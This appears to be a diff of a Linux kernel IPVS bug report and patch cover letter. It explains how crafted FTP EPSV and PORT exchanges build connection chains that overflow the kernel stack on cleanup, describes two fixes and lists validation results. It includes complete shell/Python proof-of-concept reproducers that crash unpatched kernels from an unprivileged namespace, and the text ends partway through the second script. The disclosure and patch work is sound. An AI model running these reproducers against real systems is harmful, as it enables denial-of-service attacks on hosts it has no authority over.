-+#ifndef IP_VS_SVC_F_SECURE_TCP
-+#define IP_VS_SVC_F_SECURE_TCP	0x0100
-+#endif
-+
-+/* 16-byte address storage, matching union nf_inet_addr for AF_INET */
-+struct inet_addr16 {
-+	uint8_t all[16];
-+};
-+
-+/* ---------------- family resolver ---------------- */
-+static int ctrl_attr_cb(const struct nlattr *attr, void *data)
-+{
-+	const struct nlattr **tb = data;
-+	int type = mnl_attr_get_type(attr);
-+
-+	if (mnl_attr_type_valid(attr, CTRL_ATTR_MAX) < 0)
-+		return MNL_CB_ERROR;
-+	if (type == CTRL_ATTR_FAMILY_ID) {
-+		if (mnl_attr_validate(attr, MNL_TYPE_U16) < 0)
-+			return MNL_CB_ERROR;
-+		tb[CTRL_ATTR_FAMILY_ID] = attr;
-+	}
-+	return MNL_CB_OK;
-+}
-+
-+static int ctrl_data_cb(const struct nlmsghdr *nlh, void *data)
-+{
-+	const struct nlattr *tb[CTRL_ATTR_MAX + 1] = { 0 };
-+	uint16_t *fam = data;
-+
-+	if (nlh->nlmsg_type != GENL_ID_CTRL)
-+		return MNL_CB_OK;
-+	mnl_attr_parse(nlh, sizeof(struct genlmsghdr),
-+		       (mnl_attr_cb_t)ctrl_attr_cb, tb);
-+	if (tb[CTRL_ATTR_FAMILY_ID]) {
-+		*fam = mnl_attr_get_u16(tb[CTRL_ATTR_FAMILY_ID]);
-+		return MNL_CB_STOP;
-+	}
-+	return MNL_CB_OK;
-+}
-+
-+static int resolve_family(const char *name, uint16_t *fam)
-+{
-+	struct mnl_socket *nl;
-+	char buf[MNL_SOCKET_BUFFER_SIZE];
-+	struct nlmsghdr *nlh;
-+	struct genlmsghdr *genl;
-+	int ret;
-+
-+	nl = mnl_socket_open(NETLINK_GENERIC);
-+	if (!nl)
-+		return -errno;
-+	mnl_socket_bind(nl, 0, 0);
-+
-+	nlh = mnl_nlmsg_put_header(buf);
-+	genl = mnl_nlmsg_put_extra_header(nlh, sizeof(struct genlmsghdr));
-+	genl->cmd = CTRL_CMD_GETFAMILY;
-+	genl->version = 1;
-+	nlh->nlmsg_type = GENL_ID_CTRL;
-+	nlh->nlmsg_flags = NLM_F_REQUEST;
-+	mnl_attr_put_strz(nlh, CTRL_ATTR_FAMILY_NAME, name);
-+
-+	if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0) {
-+		mnl_socket_close(nl);
-+		return -errno;
-+	}
-+	do {
-+		ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
-+		if (ret < 0) {
-+			if (errno == EAGAIN)
-+				continue;
-+			mnl_socket_close(nl);
-+			return -errno;
-+		}
-+		ret = mnl_cb_run(buf, ret, 0, mnl_socket_get_portid(nl),
-+				 (mnl_cb_t)ctrl_data_cb, fam);
-+	} while (ret > 0 && *fam == 0);
-+
-+	mnl_socket_close(nl);
-+	return *fam ? 0 : -ENOENT;
-+}
-+
-+/* ---------------- fill service identifying attrs ---------------- */
-+static int fill_service(struct nlmsghdr *nlh, const char *vip,
-+			uint16_t port, int full, int secure)
-+{
-+	struct inet_addr16 vaddr = { 0 };
-+	struct nlattr *nest;
-+	struct ip_vs_flags fl;
-+	int af = AF_INET;
-+
-+	if (inet_pton(af, vip, vaddr.all) != 1) {
-+		fprintf(stderr, "bad VIP %s\n", vip);
-+		return -EINVAL;
-+	}
-+
-+	nest = mnl_attr_nest_start(nlh, IPVS_CMD_ATTR_SERVICE);
-+	mnl_attr_put_u16(nlh, IPVS_SVC_ATTR_AF, af);
-+	mnl_attr_put_u16(nlh, IPVS_SVC_ATTR_PROTOCOL, IPPROTO_TCP);
-+	mnl_attr_put(nlh, IPVS_SVC_ATTR_ADDR, sizeof(vaddr), &vaddr);
-+	/* port/be16: port is passed in network order from main() */
-+	mnl_attr_put_u16(nlh, IPVS_SVC_ATTR_PORT, port);
-+
-+	if (full) {
-+		mnl_attr_put_strz(nlh, IPVS_SVC_ATTR_SCHED_NAME, "rr");
-+		memset(&fl, 0, sizeof(fl));
-+		fl.mask = IP_VS_SVC_F_SECURE_TCP;
-+		if (secure)
-+			fl.flags = IP_VS_SVC_F_SECURE_TCP;
-+		mnl_attr_put(nlh, IPVS_SVC_ATTR_FLAGS, sizeof(fl), &fl);
-+		mnl_attr_put_u32(nlh, IPVS_SVC_ATTR_TIMEOUT, 0);
-+		mnl_attr_put_u32(nlh, IPVS_SVC_ATTR_NETMASK, 0xffffffff);
-+	}
-+	mnl_attr_nest_end(nlh, nest);
-+	return 0;
-+}
-+
-+static int send_cmd(struct mnl_socket *nl, struct nlmsghdr *nlh)
-+{
-+	if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0) {
-+		perror("sendto");
-+		return -1;
-+	}
-+	return 0;
-+}
-+
-+/* ---------------- get secure flag ---------------- */
-+static int svc_attr_cb(const struct nlattr *attr, void *data)
-+{
-+	const struct nlattr **tb = data;
-+	int type = mnl_attr_get_type(attr);
-+
-+	if (mnl_attr_type_valid(attr, IPVS_SVC_ATTR_MAX) < 0)
-+		return MNL_CB_ERROR;
-+	tb[type] = attr;
-+	return MNL_CB_OK;
-+}
-+
-+static int get_cb(const struct nlmsghdr *nlh, void *data)
-+{
-+	const struct nlattr *tb[IPVS_SVC_ATTR_MAX + 1] = { 0 };
-+	struct ip_vs_flags fl;
-+	int *secure = data;
-+	struct nlattr *nest;
-+
-+	mnl_attr_for_each(nest, nlh, sizeof(struct genlmsghdr)) {
-+		if (mnl_attr_get_type(nest) == IPVS_CMD_ATTR_SERVICE)
-+			mnl_attr_parse_nested(nest, (mnl_attr_cb_t)svc_attr_cb, tb);
-+	}
-+	if (tb[IPVS_SVC_ATTR_FLAGS]) {
-+		memcpy(&fl, mnl_attr_get_payload(tb[IPVS_SVC_ATTR_FLAGS]),
-+		       sizeof(fl));
-+		*secure = !!(fl.flags & IP_VS_SVC_F_SECURE_TCP);
-+	}
-+	return MNL_CB_STOP;
-+}
-+
-+static int do_get(uint16_t fam, const char *vip, uint16_t port)
-+{
-+	struct mnl_socket *nl;
-+	char buf[MNL_SOCKET_BUFFER_SIZE];
-+	struct nlmsghdr *nlh;
-+	struct genlmsghdr *genl;
-+	int ret, secure = -1;
-+
-+	nl = mnl_socket_open(NETLINK_GENERIC);
-+	if (!nl)
-+		return -errno;
-+	mnl_socket_bind(nl, 0, 0);
-+	nlh = mnl_nlmsg_put_header(buf);
-+	genl = mnl_nlmsg_put_extra_header(nlh, sizeof(struct genlmsghdr));
-+	genl->cmd = IPVS_CMD_GET_SERVICE;
-+	genl->version = IPVS_GENL_VERSION;
-+	nlh->nlmsg_type = fam;
-+	nlh->nlmsg_flags = NLM_F_REQUEST;
-+	ret = fill_service(nlh, vip, port, 0, 0);
-+	if (ret < 0) {
-+		mnl_socket_close(nl);
-+		return ret;
-+	}
-+	if (send_cmd(nl, nlh) < 0) {
-+		mnl_socket_close(nl);
-+		return -1;
-+	}
-+
-+	ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
-+	while (ret >= 0) {
-+		ret = mnl_cb_run(buf, ret, 0, mnl_socket_get_portid(nl),
-+				 (mnl_cb_t)get_cb, &secure);
-+		if (ret <= MNL_CB_STOP || secure >= 0)
-+			break;
-+		ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
-+	}
-+	mnl_socket_close(nl);
-+	if (secure < 0)
-+		return -ENOENT;
-+	printf("secure_tcp=%d\n", secure);
-+	return 0;
-+}
-+
-+/* ---------------- add service with flag ---------------- */
-+static int do_add(uint16_t fam, const char *vip, uint16_t port, int secure)
-+{
-+	struct mnl_socket *nl;
-+	char buf[MNL_SOCKET_BUFFER_SIZE];
-+	struct nlmsghdr *nlh;
-+	struct genlmsghdr *genl;
-+	int ret;
-+
-+	/* NLM_F_EXCL: fail if the service already exists */
-+	nlh = mnl_nlmsg_put_header(buf);
-+	genl = mnl_nlmsg_put_extra_header(nlh, sizeof(struct genlmsghdr));
-+	genl->cmd = IPVS_CMD_NEW_SERVICE;
-+	genl->version = IPVS_GENL_VERSION;
-+	nlh->nlmsg_type = fam;
-+	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL;
-+	ret = fill_service(nlh, vip, port, 1, secure);
-+	if (ret < 0)
-+		return 1;
-+
-+	nl = mnl_socket_open(NETLINK_GENERIC);
-+	if (!nl)
-+		return 1;
-+	mnl_socket_bind(nl, 0, 0);
-+	if (send_cmd(nl, nlh) < 0) {
-+		mnl_socket_close(nl);
-+		return 1;
-+	}
-+
-+	/* Read the reply so we can report why a command may have failed */
-+	for (;;) {
-+		ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
-+		if (ret <= 0)
-+			break;
-+		ret = mnl_cb_run(buf, ret, 0, mnl_socket_get_portid(nl),
-+				 NULL, NULL);
-+		if (ret < 0) {
-+			int e = errno;
-+
-+			fprintf(stderr, "IPVS netlink error: ret=%d errno=%d (%s)\n",
-+				ret, e, strerror(e));
-+			mnl_socket_close(nl);
-+			return 1;
-+		}
-+		if (ret <= MNL_CB_STOP)
-+			break;
-+	}
-+	mnl_socket_close(nl);
-+	return 0;
-+}
-+
-+int main(int argc, char *argv[])
-+{
-+	const char *cmd, *vip;
-+	uint16_t fam;
-+	uint16_t port;
-+	int ret, secure = 0;
-+
-+	if (argc < 4) {
-+		fprintf(stderr,
-+			"usage: %s add <vip> <port> <secure|plain>\n"
-+			"       %s get <vip> <port>\n", argv[0], argv[0]);
-+		return 2;
-+	}
-+	cmd = argv[1];
-+	vip = argv[2];
-+	port = (uint16_t)atoi(argv[3]);
-+	port = htons(port);
-+
-+	ret = resolve_family(IPVS_GENL_NAME, &fam);
-+	if (ret) {
-+		fprintf(stderr, "cannot resolve IPVS genl family: %s\n",
-+			strerror(-ret));
-+		return 1;
-+	}
-+
-+	if (strcmp(cmd, "add") == 0) {
-+		if (argc < 5) {
-+			fprintf(stderr, "usage: %s add ... <secure|plain>\n",
-+				argv[0]);
-+			return 2;
-+		}
-+		if (strcmp(argv[4], "secure") == 0) {
-+			secure = 1;
-+		} else if (strcmp(argv[4], "plain") != 0) {
-+			fprintf(stderr, "unknown mode %s\n", argv[4]);
-+			return 2;
-+		}
-+		return do_add(fam, vip, port, secure);
-+	} else if (strcmp(cmd, "get") == 0) {
-+		return do_get(fam, vip, port);
-+	}
-+
-+	fprintf(stderr, "unknown command %s\n", cmd);
-+	return 2;
-+}
+Bug details:
+
+The trigger entry point is ip_vs_ftp_out() in
+net/netfilter/ipvs/ip_vs_ftp.c. It parses an EPSV reply and creates a
+wildcard data connection from the advertised port. If that port is 21, the
+default FTP control port, ip_vs_conn_new() binds the FTP helper to the new
+connection a second time. The child has IP_VS_CONN_F_NO_CPORT, so the next
+connection from the same client to the VIP on port 21 matches the wildcard
+child instead of creating a new top-level entry. Repeating EPSV builds a
+controlled-connection chain.
+
+The active-mode path has the same chain-building condition through
+ip_vs_ftp_in(). It derives the data connection's virtual port from
+cp->vport - 1. With ports={21,20}, the derived port is 20, which is also a
+configured FTP control port and can bind the helper again. This is another
+trigger-side path; the generic cleanup root cause is in
+ip_vs_conn_expire(), not in the FTP parser.
+
+The stack overflow occurs in the generic ip_vs_conn_expire() cleanup path
+in net/netfilter/ipvs/ip_vs_conn.c. When a leaf connection is removed, it
+calls ip_vs_conn_del_put() for its controller. If that helper deletes the
+controller timer, the old code calls ip_vs_conn_expire() recursively.
+A long controller chain can therefore exhaust the kernel stack. The
+reproducer observes this during network namespace teardown, but the
+cleanup change covers the generic controller-chain path, not just teardown.
+
+Patch 1 makes ip_vs_conn_del_put() report whether it deleted the controller
+timer. When it does, ip_vs_conn_expire() continues with that controller
+through a repeat path instead of calling itself recursively. Chain cleanup
+remains synchronous and does not wait for another timer tick.
+
+Patch 2 rejects zero and configured FTP control ports before creating
+passive data connections in ip_vs_ftp_out() for PASV and EPSV. It also
+rejects a zero active-mode client port and a data port derived from a
+configured control port in ip_vs_ftp_in(). Valid data ports continue
+through the existing path.
+
+The recursive cleanup root cause was introduced by
+f9200a52eedf ("ipvs: avoid expiring many connections from timer"). The
+FTP helper's acceptance of a control port is first present in
+1da177e4c3f4 ("Linux-2.6.12-rc2"). The patches use these commits separately
+in their Fixes: trailers.
+
+Validation:
+
+Validation was run on horms/ipvs.git main at
+a401a9d547c50ef34db1088cc1fb9a201a7af657, with the two v2 patches applied
+in order: 0e288c9cbcb1 and 703557ee8a27. The fixed kernel was built with:
+
+    make -C ipvs-selected-validation-20260916 \
+        O=ipvs-selected-validation-20260916-build -j8 bzImage
+
+It completed with exit status 0 and produced bzImage and vmlinux. The
+resulting artifact hashes were:
+
+    bzImage SHA256: 934d69a04f1a64e5e2e836a4eb74f759806f0f4fd283c8ff55a6d18588306dc3
+    vmlinux SHA256: 56837fa64d65718fd067554c804a83d1c1f259a8258dd54b1dd0c47558071c51
+
+The kernel used CONFIG_USER_NS=y, CONFIG_NET_NS=y, CONFIG_NETFILTER=y,
+CONFIG_NF_CONNTRACK=y, CONFIG_NF_CONNTRACK_FTP=y, CONFIG_NF_NAT=y,
+CONFIG_IP_VS=y, CONFIG_IP_VS_RR=y, CONFIG_IP_VS_FTP=y,
+CONFIG_IP_VS_NFCT=y, CONFIG_KASAN=y, CONFIG_KASAN_GENERIC=y,
+CONFIG_KASAN_STACK=y, and CONFIG_DEBUG_INFO=y.
+
+The passive fixed-run command was:
+
+    SELF_UNSHARE=1 MODE=exit ./poc.sh 200
+
+Selected lines from the actual captured stdout were:
+
+    built 200 connections
+    rejected control-port replies: 200/200
+    ip_vs_conn entries before trigger: 200
+    passive data connections created: 0
+    exiting namespace holder
+
+The active fixed-run used this complete kernel command line:
+
+    root=/dev/sda rw console=ttyS0 earlyprintk=serial net.ifnames=0 biosdevname=0 nokaslr panic_on_warn=1 oops=panic systemd.mask=sys-kernel-config.mount systemd.mask=systemd-remount-fs.service systemd.unit=multi-user.target ip_vs_ftp.ports=21,20
+
+and this command:
+
+    SELF_UNSHARE=1 MODE=exit ./poc-active.sh 1
+
+The actual captured stdout was:
+
+    built 1 connections
+    ip_vs_conn entries before trigger: 1
+    derived data connections created: 0
+    exiting namespace holder
+
+Both fixed-run PoCs exited with status 0. Scans of the corresponding
+serial and guest-dmesg captures found no KASAN, BUG, Oops, kernel panic,
+stack-guard, or general-protection signature.
+
+The validation artifacts are the direct files from these runs:
+verify/poc-fixed-v2-current.stdout, verify/poc-fixed-v2-current.stderr,
+verify/poc-fixed-v2-current.exit, verify/qemu-fixed-v2-current.serial.log,
+verify/dmesg-fixed-v2-current.log, verify/poc-active-v2-current.stdout,
+verify/poc-active-v2-current.stderr, verify/poc-active-v2-current.exit,
+verify/qemu-active-v2-current.serial.log, and
+verify/dmesg-active-v2-current.log. Their relevant SHA256 values are:
+
+    poc.sh: fab544f6d3db61db13d87acef6c393dfded3b3b679b69c95a612e416c8b0ba7a
+    poc-active.sh: e7ead4131150844bb369acf3267ff4c69e9904fbd3c71402dcedc1f5784386ec
+    passive stdout: 1d68c6b5936c858a97f27b6e36f1e8e9416a0e6e0be1fa1cec507f99f4194907
+    active stdout: dcd4736ddc6ca66ae6dd5c66f699d204696f77af032013ea785b8c6cc4ce9d76
+    passive serial: 66256f1147d59bc02f70f83427318cf7bd37fa6183c49cf1a2ee939c5ffdea64
+    passive dmesg: 78f309ad004809382b41113b9cc4bdc89d013f6be8ac7ca81907e1b03d39219d
+    active serial: a0109351a974478b30612ca53f5e2e13a4c024e1ded7a5eb91ce417d2a5fb1a5
+    active dmesg: 33aa92fd2765b0644060a9d53394df7796c1476d435b0bdcbab79e5ff2867e0b
+
+The unpatched baseline was separately built at the same revision with
+CONFIG_NF_CONNTRACK_FTP=y, CONFIG_NF_NAT=y, and CONFIG_IP_VS_FTP=y
+built in.
+The build completed with exit status 0. Its artifact hashes were:
+
+    bzImage SHA256: 2d6e8b3e22fbe97f5ac5a05790d6b0e8e7d23b112e5c676eb8a5ddb5529349e4
+    vmlinux SHA256: 15a005e604652ec5fbeb5f68853885cbacc3d771368a528ee672b9592700d449
+
+The unpatched run used the original passive reproducer below:
+
+    SELF_UNSHARE=1 MODE=exit ./poc-original.sh 200
+
+Its actual stdout was:
+
+    built 50 connections
+    built 100 connections
+    built 150 connections
+    built 200 connections
+    ip_vs_conn entries before trigger: 201
+    exiting namespace holder
+
+The PoC exited with status 0. Namespace teardown then produced
+BUG: TASK stack guard page was hit in the serial capture, followed by a
+stack containing repeated ip_vs_conn_expire() frames. The unpatched guest
+had panic_on_warn=1 and oops=panic. Its dmesg collection exited with status
+255 after the kernel panic, so the serial capture is the complete crash
+source for this run.
+
+The crash block below is the decoded excerpt from
+verify/crashlog-unpatched-a401-v6.decode.crash.log. It was produced from
+the serial capture with ./scripts/decode_stacktrace.sh and is included
+byte-for-byte. The baseline identifies as 7.3.0-rc1+, which corresponds to
+the a401a9d547c50ef34db1088cc1fb9a201a7af657 source revision. The test
+kernel had CONFIG_KASAN=y; the panic behavior is specific to the test
+configuration, while the reported failure is a stack guard page hit.
+
+The validation runs used shell scripts with embedded Python rather than
+packetdrill because the trigger requires namespace creation, the legacy
+IPVS sockopt ABI, a cooperating TCP server, and namespace teardown.
+packetdrill cannot express that complete setup and lifecycle by itself.
+
+Reproducer:
+
+The original passive reproducer is the following shell script with an
+embedded Python program. It does not require a separate compilation step.
+With SELF_UNSHARE=1 it creates the user and network namespaces itself.
+
+We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
+
+------BEGIN poc-original.sh------
+#!/bin/sh
+set -eu
+
+DEPTH="${1:-400}"
+MODE="${MODE:-exit}"
+SELF_UNSHARE="${SELF_UNSHARE:-0}"
+
+if [ "${SELF_UNSHARE}" = "1" ] && [ -z "${POC_INNER:-}" ]; then
+	exec env POC_INNER=1 MODE="${MODE}" SELF_UNSHARE=0 \
+		unshare -Urn -- "$0" "${DEPTH}"
+fi
+
+ulimit -n 65535 2>/dev/null || true
+
+IP=/usr/sbin/ip
+PYTHON=/usr/bin/python3
+
+VIP=198.51.100.1
+REAL=198.51.100.2
+CLIENT=198.51.100.3
+PORT=21
+
+"${IP}" link set lo up
+"${IP}" addr add "${VIP}/32" dev lo 2>/dev/null || true
+"${IP}" addr add "${REAL}/32" dev lo 2>/dev/null || true
+"${IP}" addr add "${CLIENT}/32" dev lo 2>/dev/null || true
+
+exec "${PYTHON}" - "${DEPTH}" "${MODE}" "${VIP}" "${REAL}" "${CLIENT}" "${PORT}" <<'PY'
+import ctypes
+import os
+import socket
+import sys
+import threading
+import time
+
+depth = int(sys.argv[1])
+mode = sys.argv[2]
+vip = sys.argv[3]
+real = sys.argv[4]
+client_ip = sys.argv[5]
+port = int(sys.argv[6])
+
+ready = threading.Event()
+server_error = []
+client_error = []
+accepted = []
+clients = []
+
+IP_VS_BASE_CTL = 64 + 1024 + 64
+IP_VS_SO_SET_ADD = IP_VS_BASE_CTL + 2
+IP_VS_SO_SET_FLUSH = IP_VS_BASE_CTL + 5
+IP_VS_SO_SET_ADDDEST = IP_VS_BASE_CTL + 7
+
+
+class Svc(ctypes.Structure):
+    _fields_ = [
+        ("protocol", ctypes.c_uint16),
+        ("addr", ctypes.c_uint32),
+        ("port", ctypes.c_uint16),
+        ("fwmark", ctypes.c_uint32),
+        ("sched_name", ctypes.c_char * 16),
+        ("flags", ctypes.c_uint),
+        ("timeout", ctypes.c_uint),
+        ("netmask", ctypes.c_uint32),
+    ]
+
+
+class Dest(ctypes.Structure):
+    _fields_ = [
+        ("addr", ctypes.c_uint32),
+        ("port", ctypes.c_uint16),
+        ("conn_flags", ctypes.c_uint),
+        ("weight", ctypes.c_int),
+        ("u_threshold", ctypes.c_uint32),
+        ("l_threshold", ctypes.c_uint32),
+    ]
+
+
+def native_u32(ip):
+    return int.from_bytes(socket.inet_aton(ip), sys.byteorder)
+
+
+def ipvs_sock():
+    return socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+
+
+def ipvs_flush():
+    s = ipvs_sock()
+    try:
+        s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_FLUSH, b"")
+    finally:
+        s.close()
+
+
+def ipvs_add_service():
+    svc = Svc()
+    svc.protocol = socket.IPPROTO_TCP
+    svc.addr = native_u32(vip)
+    svc.port = socket.htons(port)
+    svc.fwmark = 0
+    svc.sched_name = b"rr"
+    svc.flags = 0
+    svc.timeout = 0
+    svc.netmask = 0
+
+    s = ipvs_sock()
+    try:
+        s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_ADD, bytes(svc))
+    finally:
+        s.close()
+    return svc
+
+
+def ipvs_add_dest(svc):
+    dest = Dest()
+    dest.addr = native_u32(real)
+    dest.port = socket.htons(port)
+    dest.conn_flags = 0
+    dest.weight = 1
+    dest.u_threshold = 0
+    dest.l_threshold = 0
+
+    s = ipvs_sock()
+    try:
+        s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_ADDDEST, bytes(svc) + bytes(dest))
+    finally:
+        s.close()
+
+
+def recv_line(sock):
+    data = bytearray()
+    while not data.endswith(b"\n"):
+        chunk = sock.recv(1)
+        if not chunk:
+            raise RuntimeError("unexpected EOF")
+        data.extend(chunk)
+    return bytes(data)
+
+
+def server():
+    try:
+        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        srv.bind((real, port))
+        srv.listen(depth + 16)
+        ready.set()
+        for i in range(depth):
+            conn, addr = srv.accept()
+            conn.sendall(b"220 ready\r\n")
+            line = recv_line(conn)
+            if b"EPSV" not in line.upper():
+                raise RuntimeError(f"unexpected request on level {i}: {line!r}")
+            conn.sendall(b"229 Entering Extended Passive Mode (|||21|)\r\n")
+            accepted.append(conn)
+        while True:
+            time.sleep(1)
+    except BaseException as exc:
+        server_error.append(repr(exc))
+        ready.set()
+
+
+try:
+    try:
+        ipvs_flush()
+    except OSError:
+        pass
+    service = ipvs_add_service()
+    ipvs_add_dest(service)
+except OSError as exc:
+    raise SystemExit(f"ipvs setup failed: {exc}")
+
+
+threading.Thread(target=server, daemon=True).start()
+ready.wait()
+if server_error:
+    raise SystemExit(f"server failed early: {server_error[0]}")
+
+for i in range(depth):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.bind((client_ip, 0))
+        s.connect((vip, port))
+        banner = recv_line(s)
+        if not banner.startswith(b"220 "):
+            raise RuntimeError(f"unexpected banner on level {i}: {banner!r}")
+        s.sendall(b"EPSV\r\n")
+        reply = recv_line(s)
+        if b"229 " not in reply:
+            raise RuntimeError(f"unexpected EPSV reply on level {i}: {reply!r}")
+        clients.append(s)
+        if (i + 1) % 50 == 0 or i + 1 == depth:
+            print(f"built {i + 1} connections", flush=True)
+    except BaseException as exc:
+        client_error.append(repr(exc))
+        break
+
+if client_error:
+    raise SystemExit(f"client failed: {client_error[0]}")
+if server_error:
+    raise SystemExit(f"server failed: {server_error[0]}")
+
+try:
+    with open("/proc/net/ip_vs_conn", "r", encoding="utf-8", errors="replace") as f:
+        conn_lines = sum(1 for _ in f) - 1
+except OSError:
+    conn_lines = -1
+
+print(f"ip_vs_conn entries before trigger: {conn_lines}", flush=True)
+
+if mode == "hold":
+    while True:
+        time.sleep(1)
+elif mode == "flush":
+    ipvs_flush()
+    print("IPVS flush returned", flush=True)
+    while True:
+        time.sleep(1)
+elif mode == "exit":
+    print("exiting namespace holder", flush=True)
+    sys.stdout.flush()
+    os._exit(0)
+else:
+    raise SystemExit(f"unknown MODE={mode!r}")
+PY
+------END poc-original.sh--------
+
+The active-mode validation used the following shell/Python script with
+ip_vs_ftp.ports=21,20. It checks that the derived data connection is not
+created on the fixed kernel; it is included to match the active-mode
+validation and is not used as the passive crash evidence.
+
+------BEGIN poc-active.sh------
+#!/bin/sh
+set -eu
+
+DEPTH="${1:-400}"
+MODE="${MODE:-exit}"
+SELF_UNSHARE="${SELF_UNSHARE:-0}"
+
+if [ "${SELF_UNSHARE}" = "1" ] && [ -z "${POC_INNER:-}" ]; then
+	exec env POC_INNER=1 MODE="${MODE}" SELF_UNSHARE=0 \
+		unshare -Urn -- "$0" "${DEPTH}"
+fi
+
+ulimit -n 65535 2>/dev/null || true
+
+IP=/usr/sbin/ip
+PYTHON=/usr/bin/python3
+
+VIP=198.51.100.1
+REAL=198.51.100.2
+CLIENT=198.51.100.3
+PORT=21
+
+"${IP}" link set lo up
+"${IP}" addr add "${VIP}/32" dev lo 2>/dev/null || true
+"${IP}" addr add "${REAL}/32" dev lo 2>/dev/null || true
+"${IP}" addr add "${CLIENT}/32" dev lo 2>/dev/null || true
+
+exec "${PYTHON}" - "${DEPTH}" "${MODE}" "${VIP}" "${REAL}" "${CLIENT}" "${PORT}" <<'PY'
+import ctypes
+import os
+import socket
+import sys
+import threading
+import time
+
+depth = int(sys.argv[1])
+mode = sys.argv[2]
+vip = sys.argv[3]
+real = sys.argv[4]
+client_ip = sys.argv[5]
+port = int(sys.argv[6])
+
+ready = threading.Event()
+server_error = []
+client_error = []
+accepted = []
+clients = []
+
+IP_VS_BASE_CTL = 64 + 1024 + 64
+IP_VS_SO_SET_ADD = IP_VS_BASE_CTL + 2
+IP_VS_SO_SET_FLUSH = IP_VS_BASE_CTL + 5
+IP_VS_SO_SET_ADDDEST = IP_VS_BASE_CTL + 7
+
+
+class Svc(ctypes.Structure):
+    _fields_ = [
+        ("protocol", ctypes.c_uint16),
+        ("addr", ctypes.c_uint32),
+        ("port", ctypes.c_uint16),
+        ("fwmark", ctypes.c_uint32),
+        ("sched_name", ctypes.c_char * 16),
+        ("flags", ctypes.c_uint),
+        ("timeout", ctypes.c_uint),
+        ("netmask", ctypes.c_uint32),
+    ]
+
+
+class Dest(ctypes.Structure):
+    _fields_ = [
+        ("addr", ctypes.c_uint32),
+        ("port", ctypes.c_uint16),
+        ("conn_flags", ctypes.c_uint),
+        ("weight", ctypes.c_int),
+        ("u_threshold", ctypes.c_uint32),
+        ("l_threshold", ctypes.c_uint32),
+    ]
+
+
+def native_u32(ip):
+    return int.from_bytes(socket.inet_aton(ip), sys.byteorder)
+
+
+def ipvs_sock():
+    return socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+
+
+def ipvs_flush():
+    s = ipvs_sock()
+    try:
+        s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_FLUSH, b"")
+    finally:
+        s.close()
+
+
+def ipvs_add_service():
+    svc = Svc()
+    svc.protocol = socket.IPPROTO_TCP
+    svc.addr = native_u32(vip)
+    svc.port = socket.htons(port)
+    svc.fwmark = 0
+    svc.sched_name = b"rr"
+    svc.flags = 0
+    svc.timeout = 0
+    svc.netmask = 0
+
+    s = ipvs_sock()
+    try:
+        s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_ADD, bytes(svc))
+    finally:
+        s.close()
+    return svc
+
+
+def ipvs_add_dest(svc):
+    dest = Dest()
+    dest.addr = native_u32(real)
+    dest.port = socket.htons(port)
+    dest.conn_flags = 0
+    dest.weight = 1
+    dest.u_threshold = 0
+    dest.l_threshold = 0
+
+    s = ipvs_sock()
+    try:
+        s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_ADDDEST, bytes(svc) + bytes(dest))
+    finally:
+        s.close()
+
+
+def recv_line(sock):
+    data = bytearray()
+    while not data.endswith(b"\n"):
+        chunk = sock.recv(1)
+        if not chunk:
+            raise RuntimeError("unexpected EOF")
+        data.extend(chunk)
+    return bytes(data)
+
+
+def server():
+    try:
+        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        srv.bind((real, port))
+        srv.listen(depth + 16)
+        ready.set()
+        for i in range(depth):
+            conn, addr = srv.accept()
+            conn.sendall(b"220 ready\r\n")
+            line = recv_line(conn)
+            if not line.upper().startswith(b"PORT "):
+                raise RuntimeError(f"unexpected request on level {i}: {line!r}")
+            conn.sendall(b"200 PORT command successful\r\n")
+            accepted.append(conn)
+        while True:
+            time.sleep(1)
+    except BaseException as exc:
+        server_error.append(repr(exc))
+        ready.set()
+
+
+try:
+    try:
+        ipvs_flush()
+    except OSError:
+        pass
+    service = ipvs_add_service()
+    ipvs_add_dest(service)
+except OSError as exc:
+    raise SystemExit(f"ipvs setup failed: {exc}")
+
+
+threading.Thread(target=server, daemon=True).start()
+ready.wait()
+if server_error:
+    raise SystemExit(f"server failed early: {server_error[0]}")
+
+for i in range(depth):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.bind((client_ip, 0))
+        s.connect((vip, port))
+        banner = recv_line(s)
+        if not banner.startswith(b"220 "):
+            raise RuntimeError(f"unexpected banner on level {i}: {banner!r}")
+        s.sendall(b"PORT 198,51,100,3,4,1\r\n")
+        time.sleep(0.2)
+        clients.append(s)
+        if (i + 1) % 50 == 0 or i + 1 == depth:
+            print(f"built {i + 1} connections", flush=True)
+    except BaseException as exc:
+        client_error.append(repr(exc))
+        break
+
+if client_error:
+    raise SystemExit(f"client failed: {client_error[0]}")
+if server_error:
+    raise SystemExit(f"server failed: {server_error[0]}")
+
+try:
+    with open("/proc/net/ip_vs_conn", "r", encoding="utf-8", errors="replace") as f:
+        conn_lines = sum(1 for _ in f) - 1
+except OSError:
+    conn_lines = -1
+
+print(f"ip_vs_conn entries before trigger: {conn_lines}", flush=True)
+if conn_lines != depth:
+    raise SystemExit(
+        f"expected {depth} IPVS entries, got {conn_lines}; "
+        "a derived data connection was created"
+    )
+print(f"derived data connections created: {conn_lines - depth}", flush=True)
+
+if mode == "hold":
+    while True:
+        time.sleep(1)
+elif mode == "flush":
+    ipvs_flush()
